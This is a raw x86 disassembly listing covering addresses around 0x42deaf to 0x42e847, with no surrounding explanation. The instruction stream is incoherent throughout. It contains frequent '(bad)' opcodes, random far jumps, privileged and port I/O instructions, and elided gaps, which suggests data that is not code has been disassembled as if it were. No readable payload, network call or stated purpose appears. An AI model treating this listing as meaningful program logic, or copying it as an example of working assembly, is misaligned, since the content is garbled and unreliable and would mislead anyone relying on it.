  42deaf:	jecxz  0x42deaf
  42deb1:	and    BYTE PTR [ebx+0x12654f1a],dl
  42deb7:	mov    al,dh
  42deb9:	push   edx
  42deba:	fnsave [esi+ecx*4-0x51]
  42debe:	outs   dx,DWORD PTR ds:[esi]
  42debf:	and    ah,BYTE PTR [edx]
  42dec1:	jge    0x42de8e
  42dec3:	ja     0x42de97
  42dec5:	fnsave [esi+0x1d]
  42dec8:	push   0xffffffbd
  42deca:	pop    esi
  42decb:	(bad)  
  42decc:	mov    al,ds:0xdc6f8b0
  42ded1:	pop    ss
  42ded2:	cmc    
  42ded3:	ret    
  42ded4:	and    eax,0xfbb6d8d9
  42ded9:	xchg   ebx,eax
  42deda:	out    dx,al
  42dedb:	mov    es,ecx
  42dedd:	stc    
  42dede:	cmc    
  42dedf:	lds    esi,FWORD PTR [ebp+0x43]
  42dee2:	cli    
  42dee3:	repnz retf 
  42dee5:	lods   al,BYTE PTR ds:[esi]
  42dee6:	rol    DWORD PTR [ebx],1
  42dee8:	sbb    al,0xee
  42deea:	and    dl,0xe1
  42deed:	dec    edx
  42deee:	cs in  eax,0x51
  42def1:	inc    eax
  42def2:	enter  0x5c81,0x1c
  42def6:	add    eax,0x98b475da
  42defb:	add    al,0xae
  42defd:	inc    edx
  42defe:	punpcklbw mm6,mm0
  42df01:	fild   QWORD PTR [ebx-0x65]
  42df04:	test   al,0x7a
  42df06:	inc    edx
  42df07:	mov    ecx,0x9db04917
  42df0c:	push   edi
  42df0d:	ja     0x42df3e
  42df0f:	jmp    0x287b9b37
  42df14:	bound  ebx,QWORD PTR [ecx+0x2d]
  42df17:	fidiv  DWORD PTR [edi+0x5af3a2f0]
  42df1d:	ins    DWORD PTR es:[edi],dx
  42df1e:	jno    0x42df42
  42df20:	push   cs
  42df21:	sbb    eax,0xc2c28f16
  42df26:	mov    ch,0x30
  42df28:	scas   eax,DWORD PTR es:[edi]
  42df29:	js     0x42df2f
  42df2b:	pop    ebp
  42df2c:	inc    ecx
  42df2d:	aas    
  42df2e:	sub    BYTE PTR [ebx+0x666e3a7],al
  42df34:	cmp    eax,ecx
  42df36:	cli    
  42df37:	adc    ecx,DWORD PTR [ebp+0x72]
  42df3a:	xor    BYTE PTR [esp+ebx*2+0x74e3b93a],ah
  42df41:	push   edx
  42df42:	lea    ebp,ds:0xd832e4a
  42df48:	mov    ch,0x69
  42df4a:	fisubr DWORD PTR [ebp-0x44]
  42df4d:	jmp    0x42def0
  42df4f:	and    BYTE PTR [ebp-0x80],ch
  42df52:	(bad)  [ecx-0x47]
  42df55:	std    
  42df56:	dec    ecx
  42df57:	mov    ah,0x51
  42df59:	or     dl,BYTE PTR [ebp+ecx*2+0x3b]
  42df5d:	and    eax,edi
  42df5f:	es stos BYTE PTR es:[edi],al
  42df61:	jnp    0x42deeb
  42df63:	add    BYTE PTR ss:[esi+0x72],0x81
  42df68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df69:	daa    
  42df6a:	cs rcr cl,cl
  42df6d:	addr16 nop
  42df6f:	stos   DWORD PTR es:[edi],eax
  42df70:	test   edi,eax
  42df72:	dec    edi
  42df73:	mov    ds:0x6f7c2ac3,eax
  42df78:	dec    edi
  42df79:	scas   al,BYTE PTR es:[edi]
  42df7a:	nop
  42df7b:	or     ebp,DWORD PTR [edx+0x38]
  42df7e:	div    ch
  42df80:	enter  0xf046,0xd
  42df84:	outs   dx,DWORD PTR ds:[esi]
  42df85:	imul   DWORD PTR [eax]
  42df87:	inc    edi
  42df88:	xchg   BYTE PTR [ebx],cl
  42df8a:	jecxz  0x42df3d
  42df8c:	ss inc ecx
  42df8e:	inc    esi
  42df8f:	or     eax,0xbf
	...
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x22]
  42e001:	lods   eax,DWORD PTR ds:[esi]
  42e002:	loopne 0x42dfa6
  42e004:	dec    edx
  42e005:	in     eax,dx
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0xfc000001
  42e00d:	loopne 0x42e02d
  42e00f:	int    0x89
  42e011:	dec    ebp
  42e012:	or     DWORD PTR [ebx+eax*8+0xf],edi
  42e016:	mov    dl,0x71
  42e018:	inc    ecx
  42e019:	mov    dl,0x81
  42e01b:	fistp  QWORD PTR [ecx]
  42e01d:	xor    eax,0x54f468ca
  42e022:	pop    edx
  42e023:	ins    BYTE PTR es:[edi],dx
  42e024:	sahf   
  42e025:	pop    ebp
  42e026:	xchg   ebx,eax
  42e027:	mov    bh,0x4b
  42e029:	adc    ch,bl
  42e02b:	fwait
  42e02c:	imul   ebx,ebx,0xffffffa0
  42e02f:	or     al,0x73
  42e031:	and    edx,DWORD PTR [edx]
  42e033:	mov    BYTE PTR [ecx],ch
  42e035:	jl     0x42e04f
  42e037:	test   al,0xf4
  42e039:	std    
  42e03a:	scas   al,BYTE PTR es:[edi]
  42e03b:	icebp  
  42e03c:	mov    ecx,0xf8c8db6d
  42e041:	out    0x7,al
  42e043:	mov    ebx,0xc8fbf15f
  42e048:	idiv   BYTE PTR [eax]
  42e04a:	imul   ebx,DWORD PTR [esp+eax*4+0x2],0xffffff85
  42e04f:	jbe    0x42e078
  42e051:	scas   al,BYTE PTR es:[edi]
  42e052:	sbb    al,0x96
  42e054:	ins    BYTE PTR es:[edi],dx
  42e055:	hlt    
  42e056:	adc    edx,DWORD PTR [ebx+0x21]
  42e059:	arpl   WORD PTR [ebp-0x5fd58802],si
  42e05f:	aaa    
  42e060:	out    0x5a,eax
  42e062:	loopne 0x42dff8
  42e064:	mov    al,0x56
  42e066:	xchg   esi,eax
  42e067:	jmp    0x13f01f8b
  42e06c:	lods   eax,DWORD PTR ds:[esi]
  42e06d:	pop    ecx
  42e06e:	test   al,0xb4
  42e070:	jg     0x42e063
  42e072:	sbb    ebx,ecx
  42e074:	loopne 0x42e005
  42e076:	lods   eax,DWORD PTR ds:[esi]
  42e077:	mov    esp,esp
  42e079:	cdq    
  42e07a:	xor    DWORD PTR [ebx],0x73
  42e07d:	daa    
  42e07e:	jno    0x42e023
  42e080:	(bad)  
  42e081:	jg     0x42e0f1
  42e083:	mov    eax,ds:0xc5dd16c1
  42e088:	jg     0x42e0b0
  42e08a:	jae    0x42e02a
  42e08c:	adc    eax,0xb1026bb3
  42e091:	in     eax,dx
  42e092:	dec    edx
  42e093:	xchg   edx,eax
  42e094:	and    ah,ah
  42e096:	mov    esp,0xecf8fe4b
  42e09b:	fs fwait
  42e09d:	sahf   
  42e09e:	lds    edi,FWORD PTR [edi]
  42e0a0:	mov    ds,WORD PTR [esi]
  42e0a2:	enter  0xab6e,0x66
  42e0a6:	jno    0x42e067
  42e0a8:	cmp    eax,DWORD PTR [edx+edx*2-0x42]
  42e0ac:	jo     0x42e07d
  42e0ae:	gs dec ebx
  42e0b0:	or     BYTE PTR [eax],0xec
  42e0b3:	repnz mov ebx,0xbf410cd6
  42e0b9:	push   DWORD PTR [esi+ebp*2]
  42e0bc:	sbb    BYTE PTR [esi+eax*4],0x55
  42e0c0:	sbb    eax,0xbee9866c
  42e0c5:	dec    esp
  42e0c6:	add    dh,dh
  42e0c8:	push   edx
  42e0c9:	add    eax,0xb42bac8c
  42e0ce:	mov    cl,0xc8
  42e0d0:	push   DWORD PTR [edx+0x45]
  42e0d3:	cwde   
  42e0d4:	push   eax
  42e0d5:	mov    ebp,0xb652151b
  42e0da:	pop    es
  42e0db:	jmp    0xfb11:0xfd42bf26
  42e0e2:	aas    
  42e0e3:	call   0x4a2ba669
  42e0e8:	ins    DWORD PTR es:[edi],dx
  42e0e9:	mov    ds:0x5b4d1cde,eax
  42e0ee:	push   es
  42e0ef:	ja     0x42e14c
  42e0f1:	mov    ah,0x18
  42e0f3:	or     edx,DWORD PTR [ebp-0x27]
  42e0f6:	pop    esi
  42e0f7:	pop    ebx
  42e0f8:	xor    bh,bl
  42e0fa:	bnd jmp 0x3999c37e
  42e100:	or     al,0xa6
  42e103:	and    ecx,DWORD PTR [esi]
  42e105:	rol    BYTE PTR [esi+0x2092d96],cl
  42e10b:	cld    
  42e10c:	add    esi,DWORD PTR [ebx]
  42e10e:	push   edi
  42e10f:	(bad)  [esi+0x0]
	...
  42e171:	add    BYTE PTR [eax],al
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	cwde   
  42e181:	repnz add DWORD PTR [ebp+0x1ee4f],edi
  42e188:	add    eax,0x18000001
  42e18d:	and    DWORD PTR [edx+0x6d],esi
  42e190:	aad    0x97
  42e192:	mov    dh,0xbd
  42e194:	call   0x92fd:0xd1f7f524
  42e19b:	jmp    0x7aea4346
  42e1a0:	mov    ebx,0x3cd82066
  42e1a5:	fchs   
  42e1a7:	jg     0x42e159
  42e1a9:	lea    edi,[esi+0xd94470]
  42e1af:	fistp  DWORD PTR [ecx-0x641eb07e]
  42e1b5:	les    edi,FWORD PTR [edx+0x6a9411a4]
  42e1bb:	jne    0x42e203
  42e1bd:	inc    ecx
  42e1be:	mov    bh,0x3f
  42e1c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1c1:	popf   
  42e1c2:	jmp    0xd0a8:0x69df4e29
  42e1c9:	shl    DWORD PTR [ebx-0x12],1
  42e1cc:	cmp    al,0x94
  42e1ce:	add    al,0x9d
  42e1d0:	sahf   
  42e1d1:	pop    eax
  42e1d2:	scas   eax,DWORD PTR es:[edi]
  42e1d3:	(bad)  
  42e1d4:	mov    ds:0x5f8410f6,eax
  42e1d9:	dec    esi
  42e1da:	loope  0x42e213
  42e1dc:	bound  esi,QWORD PTR [eax-0x71]
  42e1df:	scas   al,BYTE PTR es:[edi]
  42e1e0:	push   edi
  42e1e1:	push   edi
  42e1e2:	lds    esp,FWORD PTR [edi+ecx*2+0x51]
  42e1e6:	mov    ebp,0x496d00ca
  42e1eb:	jle    0x42e1ee
  42e1ed:	stos   BYTE PTR es:[edi],al
  42e1ee:	scas   eax,DWORD PTR es:[edi]
  42e1ef:	push   ss
  42e1f0:	push   esp
  42e1f1:	rol    BYTE PTR [ebx-0x6],0x2c
  42e1f5:	adc    ebx,DWORD PTR [esi]
  42e1f7:	pop    eax
  42e1f8:	jle    0x42e25d
  42e1fa:	push   eax
  42e1fb:	dec    edx
  42e1fc:	iret   
  42e1fd:	int3   
  42e1fe:	test   BYTE PTR [esi-0x2a],cl
  42e201:	fabs   
  42e203:	push   edx
  42e204:	xor    cl,bh
  42e206:	lds    eax,FWORD PTR [ecx-0x41]
  42e209:	jp     0x42e195
  42e20b:	mov    ds:0xe47f9b69,al
  42e210:	adc    cl,BYTE PTR [edx+eiz*8+0x73924ec9]
  42e217:	ja     0x42e1cd
  42e219:	sbb    dl,BYTE PTR [esi]
  42e21b:	daa    
  42e21c:	lea    edi,[ebp+0x1c]
  42e21f:	mov    ebx,0x37df6194
  42e224:	mov    bl,0xc2
  42e226:	jnp    0x42e1ce
  42e228:	nop
  42e229:	xor    eax,0x72e60d11
  42e22e:	or     al,0x61
  42e230:	jne    0x42e278
  42e232:	imul   esi,DWORD PTR [edx+0x9],0x3d0d9000
  42e239:	and    eax,0xf48e8e88
  42e23e:	fwait
  42e23f:	daa    
  42e240:	cmp    al,0xfd
  42e242:	or     dh,BYTE PTR [edx+0x2c]
  42e245:	out    dx,al
  42e246:	xor    eax,0x87f17c02
  42e24b:	stos   DWORD PTR es:[edi],eax
  42e24c:	xchg   ebp,eax
  42e24d:	mov    cl,0xfb
  42e24f:	jp     0x42e298
  42e251:	pop    ss
  42e252:	and    BYTE PTR [edx-0x6b],dh
  42e255:	sbb    al,0x9a
  42e257:	cld    
  42e258:	shr    dh,1
  42e25a:	enter  0x4aa7,0x54
  42e25e:	sbb    DWORD PTR [esi+0x5f470e2f],edx
  42e264:	pop    es
  42e265:	cli    
  42e266:	pop    ebx
  42e267:	inc    ebp
  42e268:	imul   edx,DWORD PTR [eax+0x74710460],0xffffffb4
  42e26f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42e271:	scas   al,BYTE PTR es:[edi]
  42e272:	jg     0x42e249
  42e274:	in     al,dx
  42e275:	mov    dh,0x8
  42e277:	jne    0x42e22a
  42e279:	popf   
  42e27a:	pop    edx
  42e27b:	(bad)  
  42e27c:	push   ds
  42e27d:	popf   
  42e27e:	xchg   ecx,eax
  42e27f:	sar    ebp,1
  42e281:	sti    
  42e282:	xchg   ebx,eax
  42e283:	or     eax,0x8f817cdb
  42e288:	popa   
  42e289:	dec    ecx
  42e28a:	test   al,0xab
  42e28c:	xchg   edi,eax
  42e28d:	(bad)  
  42e28e:	and    eax,0xffbc
	...
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x9e199140
  42e301:	ficom  WORD PTR [esi+ebp*8+0x54]
  42e305:	out    dx,eax
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    eax,0x76000001
  42e30d:	add    bh,0xa0
  42e310:	fild   WORD PTR [eax+0x3fbe86e]
  42e316:	aad    0x8c
  42e318:	jbe    0x42e2a0
  42e31a:	pop    esp
  42e31b:	ficomp WORD PTR [ebx-0x66]
  42e31e:	fadd   DWORD PTR [edx-0x59]
  42e321:	sub    al,0xd0
  42e323:	mov    ah,BYTE PTR [eax-0x22]
  42e326:	add    al,0x68
  42e328:	pop    ebp
  42e329:	shr    BYTE PTR [edx-0x32fd8e75],cl
  42e32f:	pop    edi
  42e330:	addr16 mov bl,0x89
  42e333:	adc    al,0xe
  42e335:	(bad)  
  42e336:	mov    ah,0xd5
  42e338:	outs   dx,DWORD PTR ds:[esi]
  42e339:	aam    0x7a
  42e33b:	xor    dh,bl
  42e33d:	cmp    BYTE PTR [ecx],0x21
  42e340:	inc    ebx
  42e341:	and    al,0x6d
  42e343:	pop    esi
  42e344:	cld    
  42e345:	push   eax
  42e346:	stos   DWORD PTR es:[edi],eax
  42e347:	sbb    DWORD PTR [edi-0xd],edx
  42e34a:	xchg   esp,eax
  42e34b:	mov    esi,0x1b2c42ee
  42e350:	ins    BYTE PTR es:[edi],dx
  42e351:	jl     0x42e397
  42e353:	mov    ds:0xcc391baf,eax
  42e358:	adc    BYTE PTR [ecx+0x74],ch
  42e35b:	outs   dx,BYTE PTR ds:[esi]
  42e35c:	mov    dh,0xc6
  42e35e:	push   ss
  42e35f:	cdq    
  42e360:	mov    ch,0x91
  42e362:	sbb    ah,BYTE PTR [edx+0x5ac12aa1]
  42e368:	xor    edx,edi
  42e36a:	mov    ebp,0xa6c822f
  42e36f:	inc    ecx
  42e370:	lods   al,BYTE PTR ds:[esi]
  42e371:	add    eax,0xb2adb7fb
  42e376:	jmp    0x7ec4:0x89c743e4
  42e37d:	pop    ss
  42e37e:	or     ecx,esp
  42e380:	mov    al,0xe8
  42e382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e383:	pop    ebp
  42e384:	sbb    DWORD PTR [ebx],edi
  42e386:	int    0xda
  42e388:	add    bl,BYTE PTR [eax]
  42e38a:	cmp    BYTE PTR [esi-0x4b0b94b8],cl
  42e390:	js     0x42e388
  42e392:	jge    0x42e359
  42e394:	stos   DWORD PTR es:[edi],eax
  42e395:	cli    
  42e396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e397:	push   edx
  42e398:	and    DWORD PTR [ecx-0x78945238],0x6247ea88
  42e3a2:	push   ecx
  42e3a3:	or     BYTE PTR [ecx],0x3f
  42e3a6:	pop    edi
  42e3a7:	xlat   BYTE PTR ds:[ebx]
  42e3a8:	into   
  42e3a9:	dec    edi
  42e3aa:	stos   BYTE PTR es:[edi],al
  42e3ab:	scas   al,BYTE PTR es:[edi]
  42e3ac:	sub    cl,BYTE PTR [edi]
  42e3ae:	push   ds
  42e3af:	mov    ecx,0x357b6aea
  42e3b4:	jmp    0xeb59:0xa357248a
  42e3bb:	loop   0x42e38d
  42e3bd:	ror    edx,0x1
  42e3c0:	jecxz  0x42e3d6
  42e3c2:	enter  0xe551,0x37
  42e3c6:	pop    edi
  42e3c7:	jae    0x42e368
  42e3c9:	stos   BYTE PTR es:[edi],al
  42e3ca:	icebp  
  42e3cb:	jbe    0x42e37e
  42e3cd:	daa    
  42e3ce:	popa   
  42e3cf:	rcl    DWORD PTR [ebx+0x304692bc],cl
  42e3d5:	cmc    
  42e3d6:	xor    esi,edx
  42e3d8:	or     eax,0x2bbec011
  42e3dd:	jbe    0x42e3ab
  42e3df:	js     0x42e455
  42e3e1:	pop    edi
  42e3e2:	xchg   esi,eax
  42e3e3:	cmp    al,0xbf
  42e3e5:	rcl    BYTE PTR [esi],0x37
  42e3e8:	push   esp
  42e3e9:	inc    ebx
  42e3ea:	in     al,0x6b
  42e3ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3ed:	ja     0x42e457
  42e3ef:	jae    0x42e406
  42e3f1:	cwde   
  42e3f2:	sub    esi,DWORD PTR [edi+edx*8-0x3f79e083]
  42e3f9:	shr    DWORD PTR [esp+eax*4+0x490e6f54],0xb5
  42e401:	in     al,0xc5
  42e403:	lahf   
  42e404:	adc    BYTE PTR [eax+0x6fc0115b],0x61
  42e40b:	push   ss
  42e40c:	xor    DWORD PTR [esi+0x4d],ebx
  42e40f:	xor    dh,bh
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	idiv   DWORD PTR [edi-0xfa650b9]
  42e486:	add    DWORD PTR [eax],eax
  42e488:	add    eax,0x85000001
  42e48d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e48e:	mov    ah,ch
  42e490:	das    
  42e491:	xchg   edi,eax
  42e492:	push   ecx
  42e493:	jg     0x42e498
  42e495:	inc    esp
  42e496:	test   esp,ecx
  42e498:	adc    ah,dl
  42e49a:	pop    esi
  42e49b:	(bad)
  42e49e:	jbe    0x42e4f5
  42e4a0:	ror    BYTE PTR [edi],cl
  42e4a2:	mov    bh,0x59
  42e4a4:	(bad)  
  42e4a5:	or     eax,0x8c333ede
  42e4aa:	push   0xffffffe0
  42e4ac:	(bad)  
  42e4ad:	loope  0x42e4ae
  42e4af:	(bad)  
  42e4b0:	xor    edx,eax
  42e4b2:	sbb    al,0x7b
  42e4b4:	dec    ebx
  42e4b5:	push   esi
  42e4b6:	cmc    
  42e4b7:	cld    
  42e4b8:	pop    ds
  42e4b9:	jmp    0x4021fd17
  42e4be:	enter  0x9e3c,0xb
  42e4c2:	test   BYTE PTR [ebp-0x69],0x16
  42e4c6:	dec    esi
  42e4c7:	mov    ds:0xb728e5ab,al
  42e4cc:	sbb    DWORD PTR [ebp+0x30c9f09],ebx
  42e4d2:	loopne 0x42e483
  42e4d4:	xchg   edx,eax
  42e4d5:	sbb    bh,BYTE PTR [edx+0x57d70b51]
  42e4db:	mov    bl,0x5a
  42e4dd:	sub    DWORD PTR ds:0x5fdd8a5f,0x11
  42e4e4:	bsr    edi,eax
  42e4e7:	jl     0x42e4b7
  42e4e9:	jg     0x42e49f
  42e4eb:	aaa    
  42e4ec:	outs   dx,BYTE PTR ds:[esi]
  42e4ed:	mov    ecx,0x7e55850c
  42e4f2:	int3   
  42e4f3:	dec    eax
  42e4f4:	imul   edi,DWORD PTR [eax+0x40],0xffffffa2
  42e4f8:	nop
  42e4f9:	ds push 0x30
  42e4fc:	pop    edi
  42e4fd:	pop    eax
  42e4fe:	pop    ebx
  42e4ff:	inc    edx
  42e500:	and    BYTE PTR [edi-0x78a874cf],cl
  42e506:	fmul   QWORD PTR [eax+0x1ff40680]
  42e50c:	test   DWORD PTR [edi-0x5],eax
  42e50f:	and    al,0x58
  42e511:	add    eax,0x9b64b721
  42e516:	push   edi
  42e517:	jns    0x42e4c5
  42e519:	push   edi
  42e51a:	imul   esi,esi,0x8a73195f
  42e520:	xor    DWORD PTR [ebx+esi*1-0x12],esp
  42e524:	mov    esp,0x1ef116fb
  42e529:	icebp  
  42e52a:	sti    
  42e52b:	jnp    0x42e560
  42e52d:	shr    DWORD PTR [edi+0x23],0x4d
  42e531:	add    esp,DWORD PTR [esi+0x7e]
  42e534:	dec    edx
  42e535:	cli    
  42e536:	adc    bh,BYTE PTR [ebx+0x14557cbd]
  42e53c:	popa   
  42e53d:	lods   eax,DWORD PTR ds:[esi]
  42e53e:	call   0x8450fd5f
  42e543:	out    dx,al
  42e544:	loopne 0x42e518
  42e546:	cwde   
  42e547:	test   BYTE PTR [esi-0x64d0681b],ah
  42e54d:	mov    ds:0xb7ecbac6,al
  42e552:	fdiv   DWORD PTR [eax+0x17]
  42e555:	sbb    ebp,ebp
  42e557:	sub    eax,0x4324208e
  42e55c:	fistp  DWORD PTR [eax-0x74eefd]
  42e562:	adc    eax,0xa6a172fe
  42e567:	mov    fs,WORD PTR [eax]
  42e569:	mov    ecx,0xcba68551
  42e56e:	xchg   edi,eax
  42e56f:	sub    eax,0x282d0fa7
  42e574:	mov    edi,0xb2f2a563
  42e579:	xor    al,0x1b
  42e57b:	les    ecx,FWORD PTR ds:0xd22216e4
  42e581:	inc    ebx
  42e582:	pusha  
  42e583:	and    eax,0xecd97472
  42e588:	push   ebx
  42e589:	outs   dx,BYTE PTR ds:[esi]
  42e58a:	sbb    edx,edi
  42e58c:	addps  xmm1,XMMWORD PTR [edi]
  42e58f:	stos   DWORD PTR es:[edi],eax
  42e590:	and    eax,DWORD PTR [eax]
	...
  42e5f2:	add    BYTE PTR [eax],al
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	lock add eax,0xf15e0bb5
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    eax,0xaf000001
  42e60d:	pop    ss
  42e60e:	inc    eax
  42e60f:	mov    ecx,0x57237d1a
  42e614:	mov    bh,0xd9
  42e616:	mul    BYTE PTR [eax+eax*4]
  42e619:	add    BYTE PTR [eax+0x15],cl
  42e61c:	adc    ah,BYTE PTR [ebp+0x123044f]
  42e622:	data16 (bad) 
  42e624:	int3   
  42e625:	into   
  42e626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e627:	and    cl,BYTE PTR [ecx]
  42e629:	xchg   ebp,eax
  42e62a:	popa   
  42e62b:	sub    dl,BYTE PTR [esi+0xc31c701]
  42e631:	outs   dx,BYTE PTR ds:[esi]
  42e632:	dec    edx
  42e633:	enter  0x957f,0xce
  42e637:	call   0xbd688f57
  42e63c:	add    eax,0x1eca920b
  42e641:	shl    BYTE PTR [ebp+eiz*4-0x3],cl
  42e645:	rcr    dh,cl
  42e647:	add    BYTE PTR [edi-0x2b5a9f6a],dh
  42e64d:	lods   al,BYTE PTR ds:[esi]
  42e64e:	ins    DWORD PTR es:[edi],dx
  42e64f:	sub    bl,ah
  42e651:	inc    edi
  42e652:	cmp    DWORD PTR [di],0x42
  42e656:	aaa    
  42e657:	push   ds
  42e658:	call   0x4661e45c
  42e65d:	mov    sp,0x6716
  42e661:	mov    dh,BYTE PTR [ebx]
  42e663:	inc    eax
  42e664:	int3   
  42e665:	xchg   ebx,eax
  42e666:	(bad)  
  42e667:	daa    
  42e668:	cld    
  42e669:	std    
  42e66a:	pop    edx
  42e66b:	mov    ah,0xba
  42e66d:	mov    ebx,0x91e6686f
  42e672:	adc    DWORD PTR [ecx+0x58],eax
  42e675:	mov    al,0x29
  42e677:	das    
  42e678:	(bad)  
  42e679:	push   esp
  42e67a:	loop   0x42e672
  42e67c:	lahf   
  42e67d:	outs   dx,BYTE PTR ds:[esi]
  42e67e:	bound  ecx,QWORD PTR [ecx+0x3c]
  42e681:	push   ebx
  42e682:	mov    al,0xa8
  42e684:	or     DWORD PTR [edx],edi
  42e686:	jns    0x42e60f
  42e688:	cmp    BYTE PTR [ebx+0x3b6e38bc],dl
  42e68e:	scas   al,BYTE PTR es:[edi]
  42e68f:	fsubr  QWORD PTR ds:[ebx*2-0x26263fcf]
  42e697:	cmp    ch,BYTE PTR [edx]
  42e699:	mov    ecx,0x1ed1f7c8
  42e69e:	add    al,0x6
  42e6a0:	fwait
  42e6a1:	rol    BYTE PTR [edx-0x74],1
  42e6a4:	inc    eax
  42e6a5:	dec    edi
  42e6a6:	adc    ebx,ecx
  42e6a8:	mov    ds:0x4c1a1178,eax
  42e6ad:	cmp    eax,0xac566817
  42e6b2:	xchg   ebx,eax
  42e6b3:	ds ss cld 
  42e6b6:	and    cl,BYTE PTR gs:[ebx]
  42e6b9:	aaa    
  42e6ba:	cmp    DWORD PTR [edi-0x3f037ab2],esi
  42e6c0:	jmp    0x11105c59
  42e6c5:	mov    ch,0x6c
  42e6c7:	fdivr  DWORD PTR [ecx+0x4a]
  42e6ca:	sub    al,0x8e
  42e6cc:	mov    cl,0x35
  42e6ce:	data16 and BYTE PTR [edi+esi*2+0x10174a2b],dl
  42e6d6:	fiadd  WORD PTR [esp+edi*8+0x56]
  42e6da:	fnstsw WORD PTR [esi-0x32]
  42e6dd:	leave  
  42e6de:	aaa    
  42e6df:	gs enter 0x9297,0xe3
  42e6e4:	xor    eax,0xd1fed661
  42e6e9:	cmp    BYTE PTR [edi+0x43],dl
  42e6ec:	dec    esi
  42e6ed:	xchg   edx,eax
  42e6ee:	dec    esp
  42e6ef:	ret    0x27b6
  42e6f2:	push   esi
  42e6f3:	add    dh,dh
  42e6f5:	out    0xa7,eax
  42e6f7:	and    cl,BYTE PTR [edi+0x5e]
  42e6fa:	(bad)  
  42e6fc:	pusha  
  42e6fd:	inc    esp
  42e6fe:	inc    edi
  42e6ff:	daa    
  42e700:	mov    edi,0x2592445
  42e705:	dec    esi
  42e706:	out    0xfd,al
  42e708:	cld    
  42e709:	call   0x4e337cd4
  42e70e:	sbb    BYTE PTR es:[ecx],dl
	...
  42e771:	add    BYTE PTR [eax],al
  42e773:	add    BYTE PTR [edx+0x39],bl
  42e776:	dec    esi
  42e777:	sub    eax,0x7f7b7f6f
  42e77c:	sub    BYTE PTR fs:[esi],cl
  42e77f:	fiadd  DWORD PTR [edx]
  42e781:	in     al,dx
  42e782:	xor    bl,BYTE PTR [esi+0x1f263]
  42e788:	add    eax,0xef000001
  42e78d:	push   ebp
  42e78e:	mov    eax,0xadf16121
  42e793:	test   DWORD PTR [ecx+0x2bdbe235],edi
  42e799:	push   eax
  42e79a:	div    DWORD PTR [edi]
  42e79c:	loopne 0x42e783
  42e79e:	dec    esp
  42e79f:	fs ds int3 
  42e7a2:	fld    QWORD PTR [ebx+edi*4]
  42e7a5:	or     ch,dl
  42e7a7:	fwait
  42e7a8:	mov    dl,0xb6
  42e7aa:	push   ebx
  42e7ab:	add    BYTE PTR [edi+0x2f],al
  42e7ae:	push   eax
  42e7af:	and    eax,0x51a03d54
  42e7b4:	jg     0x42e773
  42e7b6:	iret   
  42e7b7:	ja     0x42e748
  42e7b9:	xchg   ebx,eax
  42e7ba:	push   ebp
  42e7bb:	adc    esp,DWORD PTR [edi+0x317af3bc]
  42e7c1:	hlt    
  42e7c2:	inc    ebp
  42e7c3:	arpl   WORD PTR [ecx-0x42749971],cx
  42e7c9:	mov    eax,ds:0x7964df62
  42e7ce:	pop    edi
  42e7cf:	adc    eax,0x5af4af21
  42e7d4:	fs sub eax,0x4cba99d2
  42e7da:	ficom  DWORD PTR [esi]
  42e7dc:	dec    eax
  42e7dd:	and    DWORD PTR [edi+0x64],ecx
  42e7e0:	push   ss
  42e7e1:	pushf  
  42e7e2:	adc    bl,BYTE PTR [ecx+edx*8+0x47]
  42e7e6:	lods   eax,DWORD PTR ds:[esi]
  42e7e7:	jp     0x42e7a4
  42e7e9:	cmp    eax,0x2c9589ef
  42e7ee:	or     ebx,DWORD PTR [edx+0x2f6b918e]
  42e7f4:	xchg   esp,eax
  42e7f5:	mov    bh,0xbd
  42e7f7:	adc    al,0xe
  42e7f9:	sti    
  42e7fa:	lahf   
  42e7fb:	jle    0x42e7cd
  42e7fd:	aad    0x5d
  42e7ff:	lock cmc 
  42e801:	ja     0x42e81d
  42e803:	fincstp 
  42e805:	mov    fs,WORD PTR [edx]
  42e807:	mov    eax,ds:0xfbd4f1e0
  42e80c:	je     0x42e874
  42e80e:	arpl   WORD PTR [eax-0x10],sp
  42e811:	cmp    edi,DWORD PTR [eax+0x4d]
  42e814:	loope  0x42e7f7
  42e816:	(bad)  
  42e817:	rol    DWORD PTR [ebp-0x69],0x6a
  42e81b:	call   0x9ef720fb
  42e820:	push   cs
  42e821:	jg     0x42e808
  42e823:	lahf   
  42e824:	outs   dx,DWORD PTR ds:[esi]
  42e825:	push   ebp
  42e826:	lock sahf 
  42e828:	adc    eax,0x2967e09b
  42e82d:	enter  0x4de6,0x49
  42e831:	dec    edi
  42e832:	stos   BYTE PTR es:[edi],al
  42e833:	and    ch,BYTE PTR [edi]
  42e835:	pop    edx
  42e836:	test   bh,bh
  42e838:	pop    es
  42e839:	stos   DWORD PTR es:[edi],eax
  42e83a:	out    0xb8,al
  42e83c:	ins    DWORD PTR es:[edi],dx
  42e83d:	xchg   ebx,eax
  42e83e:	jnp    0x42e82e
  42e840:	ins    DWORD PTR es:[edi],dx
  42e841:	mov    dl,0xe2
  42e843:	lea    esi,es:[edx-0x15]
  42e847:	in     al,0x71
